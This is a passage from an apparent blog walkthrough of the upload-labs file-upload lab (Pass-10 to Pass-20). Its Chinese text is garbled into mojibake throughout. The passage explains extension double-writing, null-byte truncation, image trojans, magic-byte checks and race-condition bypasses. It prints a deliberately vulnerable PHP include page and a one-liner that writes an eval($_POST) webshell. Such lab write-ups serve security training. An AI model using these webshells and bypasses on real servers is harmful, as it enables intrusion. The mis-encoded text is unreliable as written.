çœ‹ï¼Œè²Œä¼¼å‰å‡ å…³çš„æ¼æ´éƒ½æ²¡æœ‰äº†ï¼Œè§‚å¯Ÿä»£ç ï¼š</p><p><img src="/2021/01/24/upload/12.jpg" alt="12"></p><p>è¿›è¡Œäº†ä¸€æ¬¡åˆ é™¤<code>.</code>çš„æ“ä½œå°±ç›´æ¥æ‹¼æ¥åˆ°äº†ä¸Šä¼ ç›®å½•çš„åé¢</p><p><img src="/2021/01/24/upload/13.jpg" alt="13"></p><p>è€Œå‰é¢å‡ å…³éƒ½æ˜¯åšå®Œæ‰€æœ‰çš„é˜²ç»•è¿‡å¤„ç†ä¹‹åå¾—åˆ°çš„æ–‡ä»¶åè¿›è¡Œæ‹¼æ¥çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€æ„é€ ä¸€ä¸ª<strong>ç»è¿‡æ‰€æœ‰çš„é˜²ç»•è¿‡æ“ä½œä¹‹åä¸åœ¨é»‘åå•ä¸­ï¼Œå¹¶ä¸”ç»è¿‡å»é™¤æœ«å°¾â€.â€å·ä¹‹åæ‹¼æ¥è¿˜èƒ½è¢«è§£æçš„åç¼€</strong>ï¼Œæ•…æœ¬å…³å¯åœ¨æ–‡ä»¶åç¼€åŠ ä¸Š<code>. .</code>ä¸€ä¸ªç‚¹åº”ä»˜ä¸€æ¬¡å»ç‚¹ï¼Œä¸€ä¸ªç©ºæ ¼åº”ä»˜ä¸€ä¸ªå»ç©ºæ ¼ï¼Œè¿™æ ·å°±å¯ä»¥äº†</p><h1>Pass-11ï¼ˆé»‘åå•-åŒå†™ç»•è¿‡)</h1><p>æœ¬å…³çš„å…³é”®åœ¨str_ireplaceï¼ˆï¼‰å‡½æ•°</p><p>è¯­æ³•:</p><pre><code class="hljs reasonml">str<span class="hljs-constructor">_ireplace(<span class="hljs-params">find</span>,<span class="hljs-params">replace</span>,<span class="hljs-params">string</span>,<span class="hljs-params">count</span>)</span></code></pre><p>æ­¤å‡½æ•°ç”¨äºæ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œæ¯”å¦‚æœ¬å…³æºä»£ç ä¸­<code>str_ireplace($deny_ext,&quot;&quot;, $file_name)</code>ä¾¿æ˜¯å°†<strong>æ–‡ä»¶åä¸­å«æœ‰é»‘åå•å­—ç¬¦ä¸²çš„é‚£ä¸€éƒ¨åˆ†æ›¿æ¢ä¸ºç©º</strong>ï¼Œå…·ä½“ç”¨æ³•ï¼š<a href="https://www.w3school.com.cn/php/func_string_str_ireplace.asp">str_irplaceå‡½æ•°</a></p><p>åˆ©ç”¨æ­¤ç‰¹æ€§ä¾¿å¯æ„é€ <code>.pphphp</code>åç¼€ï¼Œå½“åŒ¹é…åˆ°ç¬¬ä¸€ä¸ªpæ—¶ä¸æ»¡è¶³ï¼ŒåŒ¹é…åˆ°ç¬¬äºŒä¸ªå°±èƒ½åŒ¹é…åˆ°phpä¸”è¢«å»é™¤ï¼Œè¿™é‡Œåœ¨åŒ¹é…å®Œæˆä¹‹åå°±ä¸ä¼šå¯¹å‰©ä¸‹çš„ç»§ç»­è¿›è¡ŒåŒ¹é…äº†ï¼Œå› æ­¤å‰©ä¸‹çš„på’Œhpè‡ªç„¶å°±ç»„åˆä¸ºäº†phpã€‚å®Œç¾ç»•è¿‡str_ireplaceï¼ˆï¼‰å‡½æ•°çš„è¿‡æ»¤ã€‚</p><h1>Pass-12ï¼ˆç™½åå•-0x00æˆªæ–­-GETå‹)</h1><p>æç¤ºé‡Œè¯´ä¸Šä¼ è·¯å¾„å¯æ§ï¼ŒæŸ¥çœ‹æºç ï¼Œåˆ¤æ–­ä¸ºç™½åå•éªŒè¯ï¼Œä½†æ˜¯è·¯å¾„å¯æ§æ˜¯ä»€ä¹ˆæ„æ€?</p><p>æˆªæ–­åŸç†ï¼šchr()æ˜¯ä¸€ä¸ªç”¨æ¥è¿”å›å‚æ•°æ‰€å¯¹åº”çš„å­—ç¬¦çš„å‡½æ•°ï¼Œæ•…chrï¼ˆï¼‰è¡¨ç¤ºç©ºï¼Œ<strong>å½“ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­å­˜åœ¨ç©ºå­—ç¬¦æ—¶ï¼Œä¼šå¯¼è‡´ç©ºå­—ç¬¦åé¢çš„å­—ç¬¦è¢«ä¸¢å¼ƒï¼ˆè¯¯æŠŠå®ƒå½“æˆç»“æŸç¬¦ï¼‰ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™å°±å¯¼è‡´æ¼æ´äº§ç”Ÿ</strong>ï¼Œä¸ä¹‹ç›¸å…³è¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><pre><code class="hljs angelscript">%<span class="hljs-number">00</span>æ˜¯å¯¹asciiç ä¸­çš„<span class="hljs-number">0</span>å¯¹åº”çš„å­—ç¬¦ç¼–ç åçš„ç»“æœï¼Œ<span class="hljs-number">0x00</span>åˆ™æ˜¯%<span class="hljs-number">00</span>è§£ç æˆçš„<span class="hljs-number">16</span>è¿›åˆ¶ã€‚å½“urlä¸­çš„å‚æ•°æ˜¯é€šè¿‡GETæ–¹å¼è·å–æ—¶ï¼Œ%<span class="hljs-number">00</span>ä¼šè¢«è‡ªåŠ¨è§£ç ã€‚å½“é€šè¿‡POSTæ–¹å¼è·å–æ—¶ï¼Œä¸ä¼šè‡ªåŠ¨è§£ç ï¼Œ%<span class="hljs-number">00</span>åªä¼šåŸæ ·è¢«å½“æˆå­—ç¬¦ä¸²æ¥è¾“å‡ºã€‚æ‰€ä»¥é€šè¿‡POSTæ–¹å¼è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å°†å®ƒçš„åå…­è¿›åˆ¶æ”¹å†™ä¸º<span class="hljs-number">0x00</span>ã€‚</code></pre><p>æˆªæ–­è¿˜éœ€æ»¡è¶³</p><ul><li>php ç‰ˆæœ¬&lt;5.3.4</li><li>php.iniä¸­çš„magic_quotes_gpcæ˜¯offçŠ¶æ€(<strong>å½“magic_quotes_gpcå¼€å¯æ—¶ï¼Œæ‰€æœ‰çš„ å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œçº¿å’Œ NULLå­—ç¬¦ï¼ˆ%00ï¼‰éƒ½ä¼šè¢«è‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªåæ–œæ è¿›è¡Œè½¬ä¹‰</strong>)</li></ul><p>ä¸Šä¼ ï¼ŒæŠ“åŒ…ï¼Œåšå¦‚ä¸‹ä¿®æ”¹ï¼š</p><p><img src="/2021/01/24/upload/14.jpg" alt="14"></p><h1>Pass-13ï¼ˆç™½åå•-0x00æˆªæ–­-POSTå‹)</h1><p>æœ¬å…³ä¸ä¸Šä¸€å…³ç›¸ä¼¼ï¼Œä¸Šä¸€å…³ä¸ºGETæ–¹å¼æœ¬å…³ä¸ºPOSTæ–¹å¼ï¼Œå‰é¢è®²äº†POSTå’ŒGETçš„åŒºåˆ«ï¼Œæ•…æœ¬å…³åªéœ€åœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šï¼Œå°†hexä¸­ç©ºæ ¼çš„å€¼ç”±0dæ”¹æˆ00å³å¯</p><h1>Pass-14ï¼ˆç™½åå•-å›¾ç‰‡é©¬)</h1><p>æç¤ºè¯´æœ¬å…³æ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚ï¼ŒæŸ¥çœ‹æºç ï¼Œæºç åªæ£€æµ‹æ–‡ä»¶å¤´éƒ¨2ä¸ªå­—èŠ‚ä¿¡æ¯ï¼Œé‚£å®ƒæ€ä¹ˆçŸ¥é“æ–‡ä»¶ç±»å‹ï¼ŸæŸ¥é˜…èµ„æ–™å‘ç°ï¼Œä¸€èˆ¬çš„æ–‡ä»¶å‰ä¸¤ä¸ªå­—èŠ‚ä¿¡æ¯éƒ½èƒ½è¡¨æ˜è‡ªå·±æ–‡ä»¶ç±»å‹ï¼ˆç”¨winhexå¯Ÿçœ‹å›¾ç‰‡çš„æ–‡ä»¶å¤´ï¼‰ä¾‹å¦‚ï¼š</p><table><thead><tr><th>type</th><th>ExtensionsHeader</th></tr></thead><tbody><tr><td>jpeg</td><td>0xFFD8FF</td></tr><tr><td>png</td><td>0x89504E470D0A1A0A</td></tr><tr><td>gif</td><td>GIF8</td></tr><tr><td>tiff</td><td>0x49492A00 or 0x4D4D002A</td></tr><tr><td>Bit   map</td><td>BM</td></tr><tr><td>PC Paintbrush</td><td>0x0A050108</td></tr><tr><td>AOL ART</td><td>0x4A47040E000000 or 0x4A47030E000000</td></tr></tbody></table><p>æœ¬å…³æ‰€è¯´çš„å›¾ç‰‡é©¬å°±æ˜¯æŠŠä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡å’Œä¸€ä¸ªshellæ–‡ä»¶åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå¯ä»¥æŠŠæ–°çš„æ–‡ä»¶å®šä¹‰æˆå›¾ç‰‡ã€‚</p><p><img src="/2021/01/24/upload/15.jpg" alt="15"></p><p>ä¸Šå›¾ä¸ºcmdæ–¹æ³•åˆ¶å›¾ç‰‡é©¬ã€‚æ ¼å¼ï¼š<code>copy 1.jpg/b+1.php 2.jpg </code>ï¼ˆå‚æ•°/bæŒ‡å®šä»¥äºŒè¿›åˆ¶æ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶(å›¾ç‰‡)ï¼Œå‚æ•°/aæŒ‡å®šä»¥ASCI1æ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶( phpæ–‡ä»¶)ï¼‰.</p><p>ä½†æ˜¯ä¸€å¼ å›¾ç‰‡ä¸èƒ½è¢«è§£ææˆphpæ‰§è¡Œï¼Œæ•…å›¾ç‰‡é©¬ä¸èƒ½ç›´æ¥ä¸Šä¼ ã€‚ä½†æ˜¯æœ¬å…³ä»»åŠ¡ä¸­ç¬¬äºŒç‚¹æåˆ°äº†ä½¿ç”¨<a href="http://127.0.0.1/upload-labs/include.php">æ–‡ä»¶åŒ…å«æ¼æ´</a>èƒ½è¿è¡Œå›¾ç‰‡é©¬ä¸­çš„æ¶æ„ä»£ç ã€‚æ•…æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢æ¥æ¨¡æ‹ŸçœŸå®ç¯å¢ƒã€‚</p><p>åœ¨ä¸Šä¼ ç›®å½•ä¸­æ–°å»ºä¸€ä¸ªinclude.phpæ–‡ä»¶ï¼Œå†™å…¥å¦‚ä¸‹ä»£ç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$file = $_GET[ <span class="hljs-string">&#x27;page&#x27;</span> ] ;<span class="hljs-keyword">include</span> ($file);<span class="hljs-meta">?&gt;</span></code></pre><p>å†ç”¨èšå‰‘è¿æ¥(<strong>jpgæ ¼å¼çš„æ–‡ä»¶æ— æ³•ç›´æ¥ä¸èšå‰‘è¿æ¥ï¼Œè¦å€ŸåŠ©æ–‡ä»¶åŒ…å«è·å–å·²çŸ¥çš„PHPï¼Œaspï¼Œaspxâ€¦â€¦æ–‡ä»¶æ¥è¿æ¥èšå‰‘</strong>)</p><p><img src="/2021/01/24/upload/16.jpg" alt="16"></p><h1>Pass-15(ç™½åå•-å›¾ç‰‡é©¬-getimagesize())</h1><p>äº†è§£ä¸€ä¸‹æç¤ºä¸­æåˆ°çš„<code>getimagesize()</code>å‡½æ•°:</p><p>è·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚è¯­æ³•æ ¼å¼ï¼š</p><pre><code class="hljs smali">array getimagesize ( string $filename [,<span class="hljs-built_in"> array </span>&amp;$imageinfo ] )</code></pre><p><code>getimagesize() </code>å‡½æ•°å°†æµ‹å®šä»»ä½• <code>GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP</code> å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹åŠå›¾ç‰‡é«˜åº¦ä¸å®½åº¦ã€‚è¯¦æƒ…ï¼š<a href="https://www.runoob.com/php/php-getimagesize.html">getimagesize()å‡½æ•°</a></p><p>æ¥ä¸‹æ¥åœ¨ç›®å½•é‡Œåˆ›å»ºä¸€ä¸ªphpæ–‡ä»¶æ¥æµ‹è¯•è¯¥å‡½æ•°è¿”å›æ•°ç»„çš„å„ä¸ªå€¼çš„å«ä¹‰ã€‚ä»£ç :</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$local_jpg =<span class="hljs-string">&#x27;./00.jpg&#x27;</span>;$img_data = getimagesize($local_jpg);<span class="hljs-comment">//getimagesize()å‡½æ•°å¯¹æœ¬åœ°å›¾ç‰‡00.jpgè¿›è¡Œæ£€æŸ¥</span>var_dump($img_data );<span class="hljs-comment">//æ‰“å°æ£€æŸ¥ç»“æœçš„æ•°ç»„</span><span class="hljs-meta">?&gt;</span></code></pre><p>è¿è¡Œï¼š</p><p><img src="/2021/01/24/upload/17.jpg" alt="17"></p><p>ç´¢å¼•çš„å«ä¹‰ï¼š</p><pre><code class="hljs angelscript">ç´¢å¼•<span class="hljs-number">0</span> &gt;&gt;å›¾åƒå®½åº¦çš„åƒç´ å€¼ç´¢å¼•<span class="hljs-number">1</span> &gt;&gt;å›¾åƒé«˜åº¦çš„åƒç´ å€¼ç´¢å¼•<span class="hljs-number">2</span> &gt;&gt;å›¾åƒçš„ç±»å‹ï¼Œ<span class="hljs-number">1</span> = GIFï¼Œ<span class="hljs-number">2</span> = JPGï¼Œ<span class="hljs-number">3</span> = PNGï¼Œ<span class="hljs-number">4</span> = SWFï¼Œ<span class="hljs-number">5</span> = PSDï¼Œ<span class="hljs-number">6</span> = BMPï¼Œ<span class="hljs-number">7</span> = TIFF(<span class="hljs-built_in">int</span>el byte order)ï¼Œ<span class="hljs-number">8</span> = TIFF(motorola byte order)ï¼Œ<span class="hljs-number">9</span> = JPCï¼Œ<span class="hljs-number">10</span> = JP2ï¼Œ<span class="hljs-number">11</span> = JPXï¼Œ<span class="hljs-number">12</span> = JB2ï¼Œ<span class="hljs-number">13</span> = SWCï¼Œ<span class="hljs-number">14</span> = IFFï¼Œ<span class="hljs-number">15</span> = WBMPï¼Œ<span class="hljs-number">16</span> = XBMç´¢å¼•<span class="hljs-number">3</span> &gt;&gt;ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ç´¢å¼• bits &gt;&gt;å›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼ç´¢å¼• channels &gt;&gt;å›¾åƒçš„é€šé“å€¼<span class="hljs-comment">//æœ¬æ¬¡æµ‹è¯•æ²¡æœ‰</span>ç´¢å¼• mime &gt;&gt;å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯</code></pre><p>æºä»£ç :</p><p><img src="/2021/01/24/upload/18.jpg" alt="18"></p><p>å¹¶æœªåšå…¶å®ƒæ›´å¤šçš„è¿‡æ»¤æ“ä½œï¼Œæ‰€ä»¥ä¸Šä¸€å…³çš„å›¾ç‰‡é©¬ä¾ç„¶å¯ç”¨ã€‚</p><h1>Pass-16(ç™½åå•-å›¾ç‰‡é©¬-exif_imagetype())</h1><p>æç¤ºä¸­æ¢äº†ä¸€ä¸ªå‡½æ•°ï¼šexif_imagetype()</p><pre><code class="hljs isbl">è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åï¼Œæ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› <span class="hljs-variable"><span class="hljs-literal">FALSE</span></span>ã€‚è¿”å›å€¼è·Ÿ<span class="hljs-function"><span class="hljs-title">getimagesize</span>() è¿”å›çš„æ•°ç»„ä¸­çš„ç´¢å¼• <span class="hljs-number">2</span> çš„å€¼æ˜¯ä¸€æ ·çš„(<span class="hljs-variable">pass</span>-<span class="hljs-number">15</span>ä¸­è®²çš„)</span></code></pre><p>è¯­æ³•æ ¼å¼:</p><pre><code class="hljs awk">exif_imagetype ( string <span class="hljs-variable">$filename</span><span class="hljs-regexp">//</span>æ–‡ä»¶ä½ç½®å’Œåç§°)</code></pre><p>ä¸€æ ·å†™ä¸ªæµ‹è¯•æ–‡ä»¶è¿›è¡Œæµ‹è¯•</p><p><img src="/2021/01/24/upload/19.jpg" alt="19"></p><p>å‡½æ•°è²Œä¼¼æœªå®šä¹‰ï¼ŒæŸ¥æ‰¾èµ„æ–™å‘ç°é¢æ¿é‡Œçš„æ‹“å¼ æ²¡å¼€</p><p><img src="/2021/01/24/upload/20.jpg" alt="20"></p><p>php.iniä¸­extension=php_exif.dllå‰é¢çš„åˆ†å·è¦å»æ‰ã€‚åœ¨æµ‹è¯•è¿”å›å€¼ä¸º3ï¼Œåªæ£€æŸ¥äº†ç­¾åï¼Œå›¾ç‰‡é©¬ä¾æ—§å¯ä»¥ã€‚</p><h1>Pass-17(ç™½åå•-å›¾ç‰‡é©¬-äºŒæ¬¡æ¸²æŸ“)</h1><p>æç¤ºè¯´æ¸²æŸ“äº†å›¾ç‰‡ï¼ŸæŸ¥çœ‹æºç ï¼Œä½¿ç”¨äº†imagecreatefrom ç³»åˆ—å‡½æ•°æ¥è·å–åŸæ–‡ä»¶çš„æ•°æ®å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„å›¾åƒæ–‡ä»¶ï¼Œå†é‡å‘½åã€‚</p><p><code>imagecreatefromgif()</code>ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» GIF æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ <code>imagecreatefromjpeg()</code>ï¼Œ<code>imagecreatefrompng()</code>ç­‰åŒç†ï¼Œè¿™æ ·çœ‹æ¥å›¾ç‰‡æ¸²æŸ“å¥½åƒåªæ˜¯æ¢äº†ä¸€ä¸ªåå­—è€Œå·².</p><p>å…ˆç”¨GIFè¯•ï¼Œå…ˆåˆæˆä¸€ä¸ªGIFçš„å›¾ç‰‡é©¬ï¼Œä¸Šä¼ ï¼Œè®¿é—®</p><img src="/2021/01/24/upload/21.jpg" alt="21" style="zoom: 50%;"><p>é¢â€¦å°åœºé¢â€¦ä¸æ…Œã€‚ä¸Šä¼ æˆåŠŸå´ä¸èƒ½è®¿é—®??éœ€è¦å»å¯¹æ¯”ä¸¤ä¸ªgif</p><p><img src="/2021/01/24/upload/22.jpg" alt="22"></p><p><img src="/2021/01/24/upload/23.jpg" alt="23"></p><p>å‘ç°æœåŠ¡å™¨ä¸Šæ–‡ä»¶æœ«å°¾çš„phpä»£ç ä¸è§äº†ï¼Œè¿™åº”è¯¥å°±æ˜¯æ¸²æŸ“çš„ä½œç”¨ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯è®©æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ä¾ç„¶ä¿å­˜æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç ï¼Œå°±éœ€è¦å»æ‰¾æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®ï¼Œç„¶åå°†phpä»£ç å†™è¿›å»(æ³¨æ„è¦å°†ä»£ç è½¬åŒ–ä¸ºå¯¹åº”è¿›åˆ¶ç¼–è¯‘å™¨çš„è¿›åˆ¶æ•°å†å†™å…¥),å†ä¸Šä¼ å°±å¯ä»¥å•¦ï¼Œä¸æˆªå›¾äº†ã€‚</p><p>ä½†æ˜¯æœ¬å…³çš„è¦æ±‚æ˜¯å›¾ç‰‡é©¬è¦<code>.jpg</code>,<code>.png</code>,<code>.gif</code>ä¸‰ç§åç¼€éƒ½ä¸Šä¼ æˆåŠŸæ‰ç®—è¿‡å…³ï¼pngå°±ä¸æ˜¯è¿™æ ·äº†ï¼Œè¦å®ç°pngäºŒæ¬¡æ¸²æŸ“çš„ç»•è¿‡å°±éœ€è¦æ·±å…¥äº†è§£pngçš„æ ¼å¼ã€‚æ­¤éƒ¨åˆ†å†å¦ä¸€æ–‡ç« ã€ŠäºŒæ¬¡æ¸²æŸ“&amp;&amp;pngç»“æ„åˆ†æã€‹è¯´æ˜ã€‚</p><h1>Pass-18ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-æ—¶é—´)</h1><p>æç¤ºè¯´è¦ä»£ç å®¡è®¡ï¼ŒæŸ¥çœ‹æºç ï¼Œæºç è§£é‡Šå¾—å¾ˆæ¸…æ¥šï¼Œå…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜ï¼Œç„¶åå°†æ–‡ä»¶çš„åç¼€ååŒç™½åå•å¯¹æ¯”ï¼Œç¬¦åˆå°±å°†æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚ä¸ç¬¦ï¼Œunlink()å‡½æ•°å°±ä¼šåˆ é™¤è¯¥æ–‡ä»¶ï¼Œè™½ç„¶ä¸Šä¼ ä¼šè¢«åˆ é™¤ï¼Œä½†å¦‚æœæˆ‘ä»¬èƒ½åœ¨ä¸Šä¼ çš„ä¸€å¥è¯è¢«åˆ é™¤ä¹‹å‰è®¿é—®å°±å¯ä»¥äº†ã€‚è¿™ä¸ªæ–¹æ³•ä¹Ÿå«æ¡ä»¶ç«äº‰ä¸Šä¼ ç»•è¿‡ã€‚å¯ä»¥åˆ©ç”¨burpå¤šçº¿ç¨‹å‘åŒ…ï¼Œç„¶åä¸æ–­åœ¨æµè§ˆå™¨è®¿é—®ä»£ç ï¼Œä¼šæœ‰ä¸€ç¬é—´çš„è®¿é—®æˆåŠŸï¼Œé€šè¿‡burpä¸€ç›´ä¸åœçš„é‡æ”¾ï¼Œä¼šæœ‰ä¸€ç¬é—´æ˜¯è¿˜æ²¡æ¥å¾—åŠåˆ é™¤å°±å¯ä»¥è¢«è®¿é—®åˆ°çš„ï¼Œä¸€æ—¦è®¿é—®åˆ°è¯¥æ–‡ä»¶å°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€å¥è¯ã€‚</p><p>ä¸Šä¼ çš„ä¸€å¥è¯ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-comment">//è‹¥è®¿é—®åˆ°æ–‡ä»¶åˆ™åœ¨æ ¹ç›®å½•é‡Œç”Ÿæˆshell.phpæ–‡ä»¶&#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[&quot;test&quot;])<span class="hljs-meta">?&gt;</span>&#x27;);<span class="hljs-meta">?&gt;</span></span></code></pre><p>å…ˆä¸Šä¼ ï¼ŒæŠ“åŒ…ï¼Œè®¾ç½®Null payloadsä¹Ÿå°±æ˜¯ä¸è®¾ç½®payloadã€‚è®¾ç½®Continue indefinitelyæ— é™é‡æ”¾ã€‚</p><img src="/2021/01/24/upload/24.jpg" alt="24" style="zoom:50%;"><p>æ ¹ç›®å½•å‡ºç°shell.php,è¿æ¥èšå‰‘</p><img src="/2021/01/24/upload/25.jpg" alt="25" style="zoom:50%;"><p>æˆåŠŸ~~</p><h1>Pass-19ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰-å›¾ç‰‡é©¬)</h1><p>ä¸€æ ·æ˜¯ä»£ç å®¡è®¡ï¼Œä¾æ¬¡æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€æ–‡ä»¶åæ˜¯å¦å¯å†™ã€æ£€æŸ¥åç¼€ï¼ˆç™½åå•ï¼‰ã€æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ£€æŸ¥ä¸´æ—¶æ–‡ä»¶å­˜åœ¨ã€ä¿å­˜åˆ°ä¸´æ—¶ç›®å½•é‡Œã€ç„¶åå†é‡å‘½åã€‚ä¸Pass-18å­˜åœ¨åŒæ ·çš„æ¡ä»¶ç«äº‰ã€‚ä¸è¿‡è¿™é‡Œå…ˆæ£€æŸ¥äº†åç¼€ï¼Œæ‰€ä»¥è¦ä¸Šä¼ ç¬¦åˆç™½åå•é‡Œçš„æ–‡ä»¶æ‰å¯ä»¥ï¼Œåªèƒ½ç”¨å›¾ç‰‡é©¬äº†ï¼Œè€Œä¸”éœ€è¦åœ¨å›¾ç‰‡é©¬æ²¡æœ‰è¢«é‡å‘½åä¹‹å‰è®¿é—®å®ƒã€‚æœ¬å…³å¯ä»¥æ²¿ç”¨ä¸Šä¸€å…³çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå†ç”¨ç›¸åŒæ‰‹æ®µè¿›è¡Œä¸æ–­é‡æ”¾ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©è„šæœ¬è¿›è¡Œä¸æ–­è®¿é—®ã€‚ä½†è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæœ‰è¶£çš„è§£æ³•ï¼šä¹Ÿå¯å°†phpæ–‡ä»¶åç¼€åæ›´æ”¹ä¸º.php.7zï¼Œå› ä¸ºç™½åå•ä¸­å…è®¸ä¸Šä¼ .7zçš„æ–‡ä»¶ï¼Œä½†æ˜¯apacheåˆä¸èƒ½è§£æè¿™ä¸ªæ ¼å¼è€Œä¼šæŠŠè¯¥æ–‡ä»¶å½“phpçš„æ ¼å¼è§£æã€‚</p><h1>Pass-20ï¼ˆé»‘åå•éªŒè¯-ç‚¹å·ç»•è¿‡â€¦â€¦)</h1><p>æŸ¥çœ‹ä»£ç </p><p><img src="/2021/01/24/upload/26.jpg" alt="26"></p><h4 id="æ³•ä¸€"><a class="header-anchor" href="#æ³•ä¸€">ğŸ­</a>æ³•ä¸€</h4><p>å› ä¸ºé»‘åå•éƒ½æ˜¯å°å†™çš„å½¢å¼ï¼Œæ•…å¯ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ç„¶åå°†å…¶å‘½åä¸ºPHPå½¢å¼åç¼€å³å¯ç»•è¿‡</p><h4 id="æ³•äºŒ"><a class="header-anchor" href="#æ³•äºŒ">ğŸ­</a>æ³•äºŒ</h4><p>åœ¨<code>save_name</code>å‚æ•°ä¸­æ–‡ä»¶åç§°åé¢åŠ ç©ºæ ¼ç»•è¿‡</p><h4 id="æ³•ä¸‰"><a class="header-anchor" href="#æ³•ä¸‰">ğŸ­</a>æ³•ä¸‰</h4><p>è¿˜å¯ä»¥é€šè¿‡<code>save_name</code>å‚æ•°æ¥è¿›è¡Œ00æˆªæ–­ï¼Œ</p><p><img src="/2021/01/24/upload/27.jpg" alt="27"></p><h4 id="æ³•å››"><a class="header-anchor" href="#æ³•å››">ğŸ­</a>æ³•å››</h4><p>åˆ©ç”¨<code>pathinfo</code>å‡½æ•°</p><p>æ ¼å¼ï¼š</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pathinfo</span><span class="hljs-params">(path,options)</span></span></code></pre><table><thead><tr><th style="text-align:center">å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td style="text-align:center">path</td><td>å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚</td></tr><tr><td style="text-align:center">process_sections</td><td>å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„æ•°ç»„å…ƒç´ ã€‚é»˜è®¤æ˜¯ allã€‚ å¯èƒ½çš„å€¼ï¼š                  <code>PATHINFO_DIRNAME</code> //ç›®å½•- åªè¿”å›<code>dirname   </code>                                                <code>PATHINFO_BASENAME</code> //æ–‡ä»¶åŠ åç¼€å- åªè¿”å› <code>basename  </code>                                  <code>PATHINFO_EXTENSION </code>//åç¼€å- åªè¿”å› <code>extension </code></td></tr></tbody></table><p>å’ŒPass-13ç±»ä¼¼ï¼Œä¸è¿‡æœ¬å…³ä¸ºé»‘åå•ï¼Œåœ¨æ–‡ä»¶ä¿å­˜çš„æ—¶å€™ï¼ŒåŠ 